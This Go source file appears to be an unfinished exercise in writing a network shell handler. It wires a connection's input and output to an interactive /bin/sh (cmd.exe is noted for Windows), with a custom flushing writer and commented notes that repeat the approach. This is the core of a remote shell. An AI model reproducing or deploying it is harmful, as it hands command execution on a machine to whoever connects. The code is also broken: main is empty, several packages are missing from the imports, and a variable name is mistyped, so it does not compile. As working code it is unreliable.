package main 

import (
	"fmt"
	"net"
	"os/exec"
)

// custom Flush

type Flusher struct {
	w *bufio.Writer
}


//Creates a new Flusher from an ip.Writer
func NewFlusher(w io.Writer) *Flusher {
	return &Flusher{
		w: bufio.NewWriter(w),
	}
}

func (foos *Flusher) Write(b []byte) (int, error) {
	count, err := foos.w.Write(b)
	if err != nil {
		return -1, err
	}
	if err := foos.w.Flush(); err != nil {
		return -1, err
	}
	return count, err
}


//Handler for Flush 
func Handler(conn net.Conn) {
	// calling /bin/sh using -i for interactive mode
	// For windows use "cmd.exe" 
	// cmd := exec.Command("cmd.exe")

	// linux
	cmg := exec.Command("/bin/sh", "-i")

	// set stdin 
	cmd.Stdin = conn 


	// Create FLusher from connection to use for stdout.

	cmd.Stdout = NewFlusher(conn)


	// run command
	if err := cmd.Run(); err != nil{
		log.Fatalln(err)
	}
}



func main() {


}



// Notes


	// works for linux system
	// // used for running operating system commands
	// // creates instance of CMD but dose not execute yet
	// cmd := exec.Command("/bin/sh", "-i")


	// // directly assigning Conn object to stdout and stdin
	// cmd.Stdin = conn
	// cmd.Stdout = conn


	// // run the command using cmd.Run
	// if err := cmd.Run(); err != nil {
	// 	log.Fatalln(err)
	// }